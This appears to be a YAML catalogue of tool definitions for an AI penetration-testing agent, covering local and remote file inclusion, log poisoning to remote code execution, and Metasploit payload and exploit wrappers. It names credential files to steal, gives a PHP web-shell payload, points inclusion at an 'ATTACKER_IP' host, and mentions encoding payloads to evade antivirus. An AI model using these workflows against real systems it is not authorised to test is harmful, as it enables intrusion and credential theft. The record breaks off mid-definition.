        when_to_use: 'When a web page has a file/page/template parameter that might be vulnerable to path traversal. Examples:
          url=''http://target/page.php?file={PAYLOAD}'', url=''http://target/index.php?page={PAYLOAD}''. The tool automatically
          tries traversal depths 1-8 with various encodings. Set os=''linux'' or ''windows'' to target specific paths. Use
          success_pattern for custom detection when the default /etc/passwd check doesn''t work.'
        params:
          url:
            type: string
            required: true
            description: Target URL with {PAYLOAD} placeholder
          os:
            type: enum
            values:
            - linux
            - windows
            - auto
            default: auto
            description: Target operating system
          depth:
            type: integer
            default: 8
            description: Maximum directory traversal depth
          encodings:
            type: array
            description: Encodings to try (plain, url, double-url, etc.)
          cookie:
            type: string
            description: Cookie header for authenticated testing
          headers:
            type: object
            description: Custom HTTP headers
          success_pattern:
            type: string
            description: Regex pattern indicating successful inclusion
          timeout:
            type: integer
            default: 10
            description: Request timeout per attempt
        returns:
          vulnerable:
            type: boolean
            description: Whether LFI was found
          vulnerabilities:
            type: array
            description: Working payloads and encodings
          working_payload:
            type: string
            description: First successful payload
      test_rfi:
        description: 'Test a URL parameter for Remote File Inclusion by trying 6 default PHP wrappers: direct URL, http://,
          https://, ftp://, data://text/plain;base64 (encodes a PHP include statement), and expect://. Replaces {PAYLOAD}
          in the URL with each wrapper+remote_url combination. Checks for HTTP 200 with non-empty body as success indicator.
          IMPORTANT: verify results by checking if your controlled server received an inbound request — a 200 response alone
          does not confirm RFI.'
        when_to_use: 'When a URL parameter might allow remote URL inclusion (typically PHP applications with allow_url_include=On).
          Requires a controlled remote server — use netcat http_listen or a VPS to serve a test file. Workflow: (1) start
          netcat http_listen on attacker, (2) test_rfi with remote_url pointing to your listener, (3) check http_requests
          on the listener to verify the target fetched your URL. If allow_url_include is off, try php_filter or LFI-to-RCE
          via log_poison instead.'
        params:
          url:
            type: string
            required: true
            description: Target URL with {PAYLOAD} placeholder where the file/page parameter is (e.g., 'http://target/page.php?file={PAYLOAD}').
          remote_url:
            type: string
            required: true
            description: URL on your controlled server to include (e.g., 'http://ATTACKER_IP:8080/shell.txt'). The file should
              contain PHP code if testing PHP RFI.
          wrappers:
            type: array
            description: 'PHP wrappers to try. Default: ['''', ''http://'', ''https://'', ''ftp://'', ''data://text/plain;base64,'',
              ''expect://'']. Override to test specific wrappers only.'
          cookie:
            type: string
            description: Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123').
          headers:
            type: object
            description: Custom HTTP headers as key-value pairs.
          timeout:
            type: integer
            default: 10
            description: Request timeout per wrapper attempt in seconds.
        returns:
          vulnerable:
            type: boolean
            description: Whether any wrapper returned HTTP 200 with content (verify with remote server logs).
          vulnerabilities:
            type: array
            description: Wrappers that produced a 200 response with body length — each entry has wrapper, payload, url, status_code,
              body_length.
      read_file:
        description: Read a specific file through a confirmed LFI vulnerability using the known-working traversal string and
          depth. Builds payload as (traversal * depth) + file_path, or wrapper + file_path if a PHP wrapper is specified.
          Returns the full response body (up to 100KB). Use this after test_lfi confirms the vulnerability — copy the working
          traversal and depth from those results.
        when_to_use: 'After test_lfi confirms LFI, to extract specific files. Use the working traversal/depth from test_lfi
          results. High-value files to read: /etc/shadow (password hashes), /home/*/.ssh/id_rsa (SSH keys), /var/www/html/wp-config.php
          (database creds), .env files, /proc/self/environ (environment variables with secrets), /etc/apache2/sites-enabled/*
          (vhost configs revealing internal paths). For PHP source code, use php_filter instead — read_file would execute
          the PHP rather than show source.'
        params:
          url:
            type: string
            required: true
            description: Vulnerable URL with {PAYLOAD} placeholder (same URL used in test_lfi).
          file_path:
            type: string
            required: true
            description: Absolute path of file to read (e.g., '/etc/shadow', '/home/user/.ssh/id_rsa', '/var/www/html/.env').
              Leading slash is stripped when building traversal payload.
          traversal:
            type: string
            default: ../
            description: Traversal string that worked in test_lfi (e.g., '../', '%2e%2e%2f', '..%2f'). Must match what test_lfi
              found.
          depth:
            type: integer
            default: 8
            description: Traversal depth (number of times to repeat the traversal string). Use the depth from test_lfi results.
          wrapper:
            type: string
            description: PHP wrapper to prepend instead of traversal (e.g., 'php://filter/convert.base64-encode/resource=').
              When set, traversal and depth are ignored.
          cookie:
            type: string
            description: Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123').
          headers:
            type: object
            description: Custom HTTP headers as key-value pairs.
          timeout:
            type: integer
            default: 15
            description: Request timeout in seconds. Increase for large files.
        returns:
          content:
            type: string
            description: File contents (up to 100KB). Full response body — may include surrounding HTML from the vulnerable
              page.
          content_length:
            type: integer
            description: Length of the file content in the response.
      php_filter:
        description: 'Read a file via php://filter/convert.base64-encode/resource= wrapper, which base64-encodes the file
          content before inclusion — preventing PHP execution and returning raw source code. The tool auto-extracts base64
          strings from the response (regex: 20+ base64 chars) and decodes them. Does NOT require path traversal — PHP filter
          wrapper uses absolute paths directly. Returns both raw base64 and decoded content (up to 50KB).'
        when_to_use: 'To read PHP source code without it being executed by the server. Critical for: (1) reading PHP config
          files to find database credentials (wp-config.php, config.php, .env), (2) reading PHP application source to find
          hardcoded secrets or logic flaws, (3) reading any file when standard LFI fails due to PHP execution. Does NOT need
          traversal — use file_path=''config.php'' for relative or ''/var/www/html/config.php'' for absolute. Works on any
          PHP application with LFI where php:// wrappers are enabled (allow_url_include not required for filter wrapper).'
        params:
          url:
            type: string
            required: true
            description: Vulnerable URL with {PAYLOAD} placeholder (e.g., 'http://target/page.php?file={PAYLOAD}').
          file_path:
            type: string
            required: true
            description: File to read. Can be relative (e.g., 'config.php', '../wp-config.php') or absolute (e.g., '/var/www/html/index.php').
              The tool prepends 'php://filter/convert.base64-encode/resource=' automatically.
          cookie:
            type: string
            description: Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123').
          headers:
            type: object
            description: Custom HTTP headers as key-value pairs.
          timeout:
            type: integer
            default: 15
            description: Request timeout in seconds.
        returns:
          decoded_content:
            type: string
            description: Base64-decoded file content (up to 50KB). This is the actual source code.
          base64_content:
            type: string
            description: Raw base64 string extracted from the response. Useful for manual verification.
      log_poison:
        description: 'Achieve RCE via LFI + log poisoning in two steps: (1) inject PHP code into a server log file by sending
          a request with the payload in a chosen HTTP header (User-Agent, Referer, or X-Forwarded-For), (2) include the poisoned
          log file via the confirmed LFI vulnerability to trigger PHP execution. The injection request goes to the server''s
          root URL. Then the log file is included via traversal. Checks if the payload text or ''<?php'' appears in the response
          to verify success.'
        when_to_use: 'To escalate LFI to Remote Code Execution when RFI (allow_url_include) is disabled. Requires: (1) confirmed
          LFI vulnerability (run test_lfi first), (2) knowledge of the log file path. Common log paths: Apache=/var/log/apache2/access.log,
          Nginx=/var/log/nginx/access.log, mail=/var/log/mail.log, SSH=/var/log/auth.log. Typical payload: ''<?php system($_GET["cmd"]);
          ?>'' — after poisoning, append &cmd=id to the URL to execute commands. Use User-Agent header by default (most reliably
          logged). If poisoning succeeds, subsequent requests to the LFI URL with the log file will execute your PHP code.'
        params:
          url:
            type: string
            required: true
            description: Vulnerable URL with {PAYLOAD} placeholder (same URL used in test_lfi). After poisoning, the log file
              is included via this URL.
          log_file:
            type: string
            required: true
            description: Path to the log file to poison (e.g., '/var/log/apache2/access.log', '/var/log/nginx/access.log',
              '/var/log/mail.log'). Try read_file first to confirm the log file is readable via LFI.
          payload:
            type: string
            required: true
            description: PHP code to inject into the log (e.g., '<?php system($_GET["cmd"]); ?>' for command execution, '<?php
              phpinfo(); ?>' for testing). Keep payloads short — logs may truncate long values.
          traversal:
            type: string
            default: ../
            description: Traversal string that works (from test_lfi results).
          depth:
            type: integer
            default: 8
            description: Traversal depth (from test_lfi results).
          poison_header:
            type: enum
            values:
            - User-Agent
            - Referer
            - X-Forwarded-For
            default: User-Agent
            description: HTTP header to inject the payload into. User-Agent is most commonly logged by Apache/Nginx. Try Referer
              or X-Forwarded-For if User-Agent is sanitized.
          cookie:
            type: string
            description: Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123').
          timeout:
            type: integer
            default: 15
            description: Request timeout in seconds for each of the two requests (poison + include).
        returns:
          payload_visible:
            type: boolean
            description: Whether the injected payload text appears in the log file response. True means the log was successfully
              poisoned and PHP code is present.
          body_preview:
            type: string
            description: First 2KB of the response after including the poisoned log file. Check for PHP execution output.
  metasploit:
    name: metasploit
    version: '6.4'
    description: 'Metasploit Framework v6.4 with persistent sessions via msfrpcd (RPC daemon). 9 methods: generate_payload
      (msfvenom for executables and shellcode), search_modules (find exploits/auxiliary/post modules), check_vuln (scanner
      module verification), run_exploit (execute exploit with session creation), exec_command (one-shot command execution
      via exploit), list_sessions (active meterpreter/shell sessions), session_command (run commands in sessions), post_module
      (post-exploitation modules), handler (multi/handler for reverse shells). Sessions persist across tool calls. Runs as
      a service container — msfrpcd stays running between calls.'
    image: ghcr.io/silicon-works/mcp-tools-metasploit:latest
    image_size_mb: 3000
    timeout_seconds: 600
    service: true
    service_name: metasploit
    capabilities:
    - payload_generation
    - exploit_execution
    - vulnerability_checking
    - module_search
    - session_management
    phases:
    - exploitation
    - post-exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 2048
      cpu: 1.0
    routing:
      use_for:
      - run Metasploit exploit module against a target
      - generate msfvenom payloads for reverse shells or meterpreter
      - check if target is vulnerable with Metasploit scanner module
      - manage meterpreter or shell sessions on exploited targets
      - run post-exploitation modules for credential gathering
      - set up multi/handler to catch reverse shell connections
      - search for Metasploit modules by CVE or service name
      - execute commands through exploit without full session
      never_use_for:
      - port scanning
      - directory enumeration
      - SQL injection
      triggers:
      - metasploit
      - msfvenom
      - meterpreter
      - exploit module
      - msf
      prefer_over: []
    methods:
      generate_payload:
        description: Generate a payload using msfvenom. Supports all Metasploit payloads (staged/stageless, meterpreter/shell)
          in multiple output formats (exe, elf, raw, python, php, asp, c, dll). Optional encoding with x86/shikata_ga_nai
          or other encoders for AV evasion. Returns the payload as base64.
        when_to_use: 'When you need a compiled payload binary for delivery to a target. Common payloads: ''windows/meterpreter/reverse_tcp''
          (staged Windows meterpreter), ''linux/x64/shell_reverse_tcp'' (stageless Linux reverse shell), ''php/meterpreter/reverse_tcp''
          (PHP web shell). After generating, use handler to start a listener, then deliver the payload to the target. For
          simple text-based reverse shells (bash, python one-liners), use payload tool''s revshell or exploit-runner''s generate_payload
          instead.'
        params:
          payload:
            type: string
            required: true
            description: Payload name (e.g., 'windows/meterpreter/reverse_tcp') or shortcut
          lhost:
            type: string
            required: true
            description: Listening host IP for reverse connections
          lport:
            type: integer
            required: true
            description: Listening port for reverse connections
          format:
            type: string
            default: raw
            description: 'Output format: exe, elf, raw, python, php, asp, c, dll, etc.'
          encoder:
            type: string
            description: Encoder to use (e.g., 'x86/shikata_ga_nai')
          iterations:
            type: integer
            default: 1
            description: Number of encoding iterations
        returns:
          payload_base64:
            type: string
            description: Base64 encoded payload
          size_bytes:
            type: integer
            description: Payload size in bytes
      search_modules:
        description: Search for Metasploit modules
        when_to_use: To find exploits or auxiliary modules for a specific vulnerability or service
        params:
          query:
            type: string
            required: true
            description: Search query (e.g., 'ms17-010', 'apache struts', 'smb')
          type:
            type: enum
            values:
            - all
            - exploit
            - auxiliary
            - post
            - payload
            default: all
            description: Module type to search for
        returns:
          modules:
            type: array
            description: Matching modules with paths and descriptions
      check_vuln:
        description: Check if a target is vulnerable using an auxiliary scanner module
        when_to_use: To verify if a target is vulnerable before attempting exploitation
        params:
          module:
            type: string
            required: true
            description: Auxiliary module path (e.g., 'auxiliary/scanner/smb/smb_ms17_010')
          rhosts:
            type: string
            required: true
            description: Target host(s)
          options:
            type: object
            description: Additional module options as key-value pairs
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          vulnerable:
            type: boolean
            description: Whether target appears vulnerable
      run_exploit:
        description: Run an exploit module against a target. Sets RHOSTS, payload, LHOST, LPORT, and any additional options,
          then executes. Returns whether the exploit succeeded and any new sessions created. Sessions persist across tool
          calls — use list_sessions and session_command to interact with them.
        when_to_use: 'To exploit a confirmed vulnerability with a Metasploit module. Always run check_vuln first when available.
          Common exploit workflow: search_modules(''ms17-010'') → check_vuln with the auxiliary module → run_exploit with
          the exploit module. Provide lhost/lport for reverse payloads. Sessions opened by successful exploits persist in
          msfrpcd and can be accessed later via session_command.'
        params:
          module:
            type: string
            required: true
            description: Exploit module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue')
          rhosts:
            type: string
            required: true
            description: Target host(s)
          payload:
            type: string
            description: Payload to use
          lhost:
            type: string
            description: Listening host for reverse payloads
          lport:
            type: integer
            description: Listening port for reverse payloads
          options:
            type: object
            description: Additional module options
          timeout:
            type: integer
            default: 300
            description: Timeout in seconds
        returns:
          exploit_success:
            type: boolean
            description: Whether exploit appeared successful
          sessions:
            type: array
            description: New sessions opened (id, type, info, via_exploit, tunnel_peer)
          session_count:
            type: integer
            description: Number of new sessions opened
      exec_command:
        description: Execute a command on target using an exploit with cmd/unix/generic payload
        when_to_use: For command execution exploits without needing a full session
        params:
          module:
            type: string
            required: true
            description: Exploit module path that supports command execution
          rhosts:
            type: string
            required: true
            description: Target host(s)
          command:
            type: string
            required: true
            description: Command to execute on the target
          options:
            type: object
            description: Additional module options (e.g., RPORT, TARGETURI)
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          exploit_success:
            type: boolean
            description: Whether exploit succeeded
          command_output:
            type: string
            description: Output from executed command
      list_sessions:
        description: List active Meterpreter/shell sessions
        when_to_use: To check for established sessions from previous exploits
        params:
          timeout:
            type: integer
            default: 30
            description: Timeout in seconds
        returns:
          sessions:
            type: array
            description: Active sessions with id, type, info, tunnel_local, tunnel_peer, via_exploit, via_payload, platform,
              arch
          count:
            type: integer
            description: Number of active sessions
      session_command:
        description: Run a command in an active session
        when_to_use: To execute commands in an established Meterpreter/shell session
        params:
          session_id:
            type: integer
